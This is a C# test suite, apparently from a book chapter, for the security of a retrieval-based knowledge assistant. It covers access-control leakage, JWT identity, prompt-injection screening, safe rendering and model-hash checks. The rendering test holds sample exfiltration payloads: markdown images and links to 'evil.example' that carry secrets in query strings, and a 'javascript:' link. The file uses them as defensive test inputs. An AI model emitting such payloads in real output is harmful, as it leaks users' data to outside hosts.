using System.Net;
using System.Net.Http.Json;
using System.Security.Claims;
using System.Security.Cryptography;
using System.Text.Json;
using Contoso.Corpus;
using Contoso.Knowledge.Chunking;
using Contoso.Knowledge.Documents;
using Contoso.Knowledge.Evaluation;
using Contoso.Knowledge.Retrieval;
using Contoso.Knowledge.Security;
using Microsoft.AspNetCore.Authentication.JwtBearer;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.TestHost;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using Microsoft.IdentityModel.JsonWebTokens;
using Microsoft.IdentityModel.Tokens;
using Microsoft.ML.Tokenizers;

namespace Ch22.Security.Tests;

/// <summary>The corpus, its chunks and golden set v2, loaded once for the leakage tests.</summary>
public sealed class Corpus
{
    private static readonly Lazy<Task<Corpus>> Instance = new(LoadAsync);

    public required IReadOnlyList<IndexedChunk> Chunks { get; init; }

    public required IReadOnlyList<GoldenQuestion> Questions { get; init; }

    public static Task<Corpus> GetAsync() => Instance.Value;

    private static async Task<Corpus> LoadAsync()
    {
        var chunker = new ParentChildChunker(TiktokenTokenizer.CreateForEncoding("o200k_base"), 100, 600);
        var (chunks, documents) = (new List<IndexedChunk>(), new Dictionary<string, SourceDocument>(StringComparer.Ordinal));
        foreach (var entry in GeneratedCorpus.Register().Where(e => e.CopyOf is null && !e.Id.StartsWith("INTRANET-", StringComparison.Ordinal)))
        {
            if (entry.Id == "SOP-FS-014" && entry.Version != "3") continue;
            var truth = await GeneratedCorpus.TruthAsync(entry);
            var source = new ChunkSource(entry.Id, truth.Metadata.Title, truth);
            var m = truth.Metadata;
            var document = documents[entry.Id] = new SourceDocument(entry.Id, m.Title, m.Tenant, m.AllowedGroups, source.Text);
            foreach (var chunk in await chunker.SplitAsync(source)) chunks.Add(new IndexedChunk(chunks.Count, chunk, document, m.DocumentType, m.DocumentType, m.EquipmentTags, m.EffectiveFrom, m.EffectiveTo));
        }

        return new Corpus { Chunks = chunks, Questions = GoldenSet.Load(Path.Combine(AppContext.BaseDirectory, "corpus", "golden-set.v2.jsonl")) };
    }
}

public sealed class LeakageTests
{
    [Fact]
    public async Task No_person_gets_a_chunk_they_cannot_read_for_any_golden_question()
    {
        var corpus = await Corpus.GetAsync();
        var keyword = new LuceneRetriever("keyword", corpus.Chunks, ContosoAnalyzers.Identifiers());
        var unreadable = new List<string>();
        foreach (var person in People.All)
        {
            foreach (var q in corpus.Questions)
            {
                var hits = (await keyword.RetrieveAsync(new RetrievalRequest(q.Question, person, 8), TestContext.Current.CancellationToken)).Hits;
                unreadable.AddRange(hits.Where(h => !person.CanRead(h.Chunk.Document)).Select(h => $"{person.Id} {q.Id} {h.Chunk.Document.Id}"));
            }
        }

        Assert.Empty(unreadable);
    }

    [Fact]
    public async Task Verification_blocks_what_a_stale_index_still_returns()
    {
        var corpus = await Corpus.GetAsync();
        var misShared = corpus.Chunks.First(c => c.Document.Id == "SC-2024-118").Document with { AllowedGroups = ["employees"] };
        var stale = corpus.Chunks.Select(c => c.Document.Id == misShared.Id ? c with { Document = misShared } : c).ToList();
        var acls = new AclStore(stale.Select(c => c.Document).DistinctBy(d => d.Id));
        var retriever = new VerifiedRetriever(new LuceneRetriever("keyword", stale, ContosoAnalyzers.Identifiers()), acls);
        const string question = "When does the Fabrikam Seals contract end?";

        Assert.Contains((await retriever.RetrieveAsync(new RetrievalRequest(question, People.Tomas, 8), TestContext.Current.CancellationToken)).Hits, h => h.Chunk.Document.Id == misShared.Id);
        acls.Set(misShared.Id, "procurement");
        var hits = (await retriever.RetrieveAsync(new RetrievalRequest(question, People.Tomas, 8), TestContext.Current.CancellationToken)).Hits;
        Assert.DoesNotContain(hits, h => h.Chunk.Document.Id == misShared.Id);
        Assert.True(retriever.Blocked > 0);
        Assert.Single(acls.ChangesSince(0));
    }
}

public sealed class IdentityTests
{
    private const string Audience = "api://contoso-knowledge";
    private static readonly string Issuer = $"https://login.microsoftonline.com/{ContosoDirectory.TenantId}/v2.0";
    private static readonly SymmetricSecurityKey Key = new(RandomNumberGenerator.GetBytes(32));

    private static string Token(Person person, string? tenant = null, bool overage = false, SymmetricSecurityKey? key = null)
    {
        var claims = new Dictionary<string, object> { ["tid"] = tenant ?? ContosoDirectory.TenantId, ["oid"] = ContosoDirectory.ObjectId(person.Id) };
        if (overage) claims["_claim_names"] = new Dictionary<string, object> { ["groups"] = "src1" };
        else claims["groups"] = ContosoDirectory.Default.DirectGroups(person.Id).ToArray();
        return new JsonWebTokenHandler().CreateToken(new SecurityTokenDescriptor
        {
            Issuer = Issuer, Audience = Audience, Claims = claims, Expires = DateTime.UtcNow.AddMinutes(5),
            SigningCredentials = new SigningCredentials(key ?? Key, SecurityAlgorithms.HmacSha256),
        });
    }

    private static async Task<WebApplication> StartAsync()
    {
        var builder = WebApplication.CreateSlimBuilder();
        builder.WebHost.UseTestServer();
        builder.Logging.ClearProviders();
        builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme).AddJwtBearer(o =>
        {
            o.MapInboundClaims = false;
            o.TokenValidationParameters = new TokenValidationParameters { ValidIssuer = Issuer, ValidAudience = Audience, IssuerSigningKey = Key };
        });
        builder.Services.AddAuthorization();
        var app = builder.Build();
        app.UseAuthentication();
        app.UseAuthorization();
        app.MapPost("/whoami", (JsonElement body, ClaimsPrincipal user) =>
        {
            try
            {
                return Results.Ok(EntraClaims.ToPerson(user, ContosoDirectory.Default).Id);
            }
            catch (UnauthorizedAccessException)
            {
                return Results.StatusCode(StatusCodes.Status403Forbidden);
            }
        }).RequireAuthorization();
        await app.StartAsync();
        return app;
    }

    private static async Task<(HttpStatusCode Status, string Body)> Post(HttpClient client, string? token)
    {
        using var request = new HttpRequestMessage(HttpMethod.Post, "/whoami") { Content = JsonContent.Create(new { user = "grace.liu" }) };
        if (token is not null) request.Headers.Authorization = new("Bearer", token);
        using var response = await client.SendAsync(request);
        return (response.StatusCode, await response.Content.ReadAsStringAsync());
    }

    [Fact]
    public async Task The_asker_comes_from_a_valid_token_and_never_from_the_body()
    {
        await using var app = await StartAsync();
        using var client = app.GetTestClient();
        Assert.Equal((HttpStatusCode.OK, "\"tomas.silva\""), await Post(client, Token(People.Tomas)));
        Assert.Equal(HttpStatusCode.Unauthorized, (await Post(client, null)).Status);
        Assert.Equal(HttpStatusCode.Unauthorized, (await Post(client, Token(People.Tomas, key: new SymmetricSecurityKey(RandomNumberGenerator.GetBytes(32))))).Status);
        Assert.Equal(HttpStatusCode.Forbidden, (await Post(client, Token(People.Tomas, tenant: Guid.Empty.ToString()))).Status);
    }

    [Fact]
    public void Groups_are_expanded_through_nesting_and_looked_up_on_overage()
    {
        ClaimsPrincipal Principal(Person p, bool overage)
        {
            var claims = new List<Claim> { new("tid", ContosoDirectory.TenantId), new("oid", ContosoDirectory.ObjectId(p.Id)) };
            if (overage) claims.Add(new Claim("_claim_names", "{\"groups\":\"src1\"}"));
            else claims.AddRange(ContosoDirectory.Default.DirectGroups(p.Id).Select(g => new Claim("groups", g)));
            return new ClaimsPrincipal(new ClaimsIdentity(claims, "test"));
        }

        foreach (var person in People.All)
        {
            var mapped = EntraClaims.ToPerson(Principal(person, overage: false), ContosoDirectory.Default);
            Assert.Superset(person.Groups.ToHashSet(), mapped.Groups.ToHashSet());
            Assert.Equal(mapped.Groups, EntraClaims.ToPerson(Principal(person, overage: true), ContosoDirectory.Default).Groups);
        }
    }
}

public sealed class InjectionTests
{
    private static IEnumerable<JsonElement> Attacks() =>
        File.ReadLines(Path.Combine(AppContext.BaseDirectory, "data", "attacks.v1.jsonl")).Where(l => l.Length > 0).Select(l => JsonDocument.Parse(l).RootElement);

    [Fact]
    public void The_screen_flags_every_poisoned_instruction()
    {
        foreach (var attack in Attacks().Where(a => a.GetProperty("kind").GetString() == "indirect"))
        {
            Assert.NotEmpty(InjectionDetector.Scan(attack.GetProperty("text").GetString()!));
        }
    }

    [Fact]
    public async Task The_screen_flags_no_legitimate_document()
    {
        var corpus = await Corpus.GetAsync();
        Assert.Empty(corpus.Chunks.Where(c => InjectionDetector.Scan(c.Chunk.Text).Count > 0).Select(c => c.Document.Id).Distinct());
    }

    [Fact]
    public void Rendering_drops_images_and_links_to_unknown_hosts()
    {
        var renderer = new SafeRenderer(new HashSet<string>(["intranet.contoso.example"]));
        var image = renderer.Render("E-217 means low pressure. ![s](https://evil.example/p.png?q=secret)");
        Assert.DoesNotContain("<img", image.Html, StringComparison.Ordinal);
        Assert.Single(image.Removed);
        Assert.DoesNotContain("evil.example", renderer.Render("[reset](https://evil.example/r?u=kwame)").Html, StringComparison.Ordinal);
        Assert.Contains("href=\"https://intranet.contoso.example/sop\"", renderer.Render("[SOP](https://intranet.contoso.example/sop)").Html, StringComparison.Ordinal);
        Assert.DoesNotContain("<img", renderer.Render("<img src=\"https://evil.example/x.gif\">").Html, StringComparison.Ordinal);
        Assert.DoesNotContain("javascript:", renderer.Render("[x](javascript:alert(1))").Html, StringComparison.Ordinal);
    }

    [Fact]
    public void Trust_tiers_put_correspondence_and_uploads_below_managed_records()
    {
        IndexedChunk Of(string type) => new(0, new Chunk("D", 0, 1, "x"), new SourceDocument("D", "D", "fluid", ["employees"], "x"), type, type, [], null, null);
        Assert.True(TrustTiers.Of(Of("email")) < SourceTier.Managed);
        Assert.True(TrustTiers.Of(Of("upload")) < SourceTier.Managed);
        Assert.Equal(SourceTier.Controlled, TrustTiers.Of(Of("manual")));
    }
}

public sealed class SupplyChainTests
{
    [Fact]
    public void A_model_file_must_match_its_recorded_hash()
    {
        var root = Directory.CreateTempSubdirectory().FullName;
        File.WriteAllText(Path.Combine(root, "model.onnx"), "weights");
        var good = Convert.ToHexStringLower(SHA256.HashData("weights"u8));
        File.WriteAllText(Path.Combine(root, "models.json"), JsonSerializer.Serialize(new
        {
            models = new object[]
            {
                new { name = "good", path = "model.onnx", sha256 = good },
                new { name = "tampered", path = "model.onnx", sha256 = new string('0', 64) },
                new { name = "absent", path = "missing.onnx", sha256 = good },
            },
        }));
        var checks = ModelProvenance.Verify(Path.Combine(root, "models.json"), root);
        Assert.Equal("matches", checks[0].Status);
        Assert.StartsWith("MISMATCH", checks[1].Status, StringComparison.Ordinal);
        Assert.Equal("not downloaded", checks[2].Status);
    }

    [Fact]
    public void The_ml_bom_lists_each_model_with_its_hash_and_license()
    {
        var root = Directory.CreateTempSubdirectory().FullName;
        File.WriteAllText(Path.Combine(root, "models.json"), JsonSerializer.Serialize(new
        {
            models = new object[]
            {
                new { name = "reranker", path = "r/model.onnx", url = "https://example.org/r.onnx", sha256 = new string('a', 64), license = "Apache-2.0", notes = "weights" },
                new { name = "reranker-vocab", path = "r/vocab.txt", url = "https://example.org/vocab.txt", sha256 = new string('b', 64), license = "MIT (converted)", notes = "vocabulary" },
            },
        }));
        Assert.Equal(2, MlBom.Write(Path.Combine(root, "models.json"), Path.Combine(root, "bom.json")));
        using var bom = JsonDocument.Parse(File.ReadAllText(Path.Combine(root, "bom.json")));
        var components = bom.RootElement.GetProperty("components");
        Assert.Equal("1.6", bom.RootElement.GetProperty("specVersion").GetString());
        Assert.Equal("machine-learning-model", components[0].GetProperty("type").GetString());
        Assert.Equal("file", components[1].GetProperty("type").GetString());
        Assert.Equal(new string('a', 64), components[0].GetProperty("hashes")[0].GetProperty("content").GetString());
        Assert.Equal("MIT", components[1].GetProperty("licenses")[0].GetProperty("license").GetProperty("id").GetString());
    }
}
